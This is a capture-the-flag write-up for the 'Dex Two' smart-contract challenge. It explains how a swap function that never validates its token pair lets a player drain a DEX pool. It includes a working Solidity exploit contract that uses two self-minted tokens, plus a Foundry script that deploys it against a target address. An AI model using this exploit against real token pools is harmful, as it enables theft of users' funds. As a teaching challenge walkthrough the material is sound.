# Dex Two
The objective of this challenge is to drain all the tokens from the `DEX` pool. The key to solving this challenge lies in exploiting the lack of validation in the `swap` function, which allows swapping any token for tokens in the pool.

The `swap` function in the `DexTwo` contract does not validate whether the `from` and `to` tokens are part of the pool. This oversight allows us to introduce arbitrary tokens into the pool and manipulate the exchange rate to drain the legitimate tokens.

### Exploitation Strategy
1. Deploy Malicious Tokens: Create two new ERC20 tokens that we control.
2. Add Liquidity: Transfer 1 unit of each malicious token to the DEX. This ensures that:
    
>   The `getSwapAmount` function doesn’t revert due to division by zero.
    The swap calculation becomes `(1 * balanceOf(to)) / 1`, which equals `balanceOf(to)`, allowing us to drain all the legitimate tokens in a single swap.
3. Swap Malicious Tokens for Legitimate Tokens: Use the `swap` function to exchange 1 unit of the malicious tokens for all the legitimate tokens in the pool.

I created a smart contract and a script to automate the exploitation process:

Solving.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex2 {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract Token is ERC20("Mock", "MOCK") {
    constructor() {
        _mint(_msgSender(), type(uint256).max - 1);
    }
}

contract Solving {
    IDex2 dex2;
    Token new_Token1;
    Token new_Token2;

    function solve(address _victim) external {

        dex2 = IDex2(_victim);
        new_Token1 = new Token();
        new_Token2 = new Token();

        address token1 = dex2.token1();
        address token2 = dex2.token2();
        IERC20(new_Token1).transfer(address(dex2), 1);
        IERC20(new_Token2).transfer(address(dex2), 1);
        IERC20(new_Token1).approve(address(dex2), type(uint256).max);
        IERC20(new_Token2).approve(address(dex2), type(uint256).max);
        dex2.swap(address(new_Token1), token1, 1);
        dex2.swap(address(new_Token2), token2, 1);
    }
}
```

SolvingScript.s.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";
import {Solving} from "src/Solving.sol";

contract SolvingScript is Script {
    address victim = ; // Your instance address

    function run() external {
        vm.startBroadcast();
        Solving solving = new Solving();
        solving.solve(victim);
        vm.stopBroadcast();
    }
}
```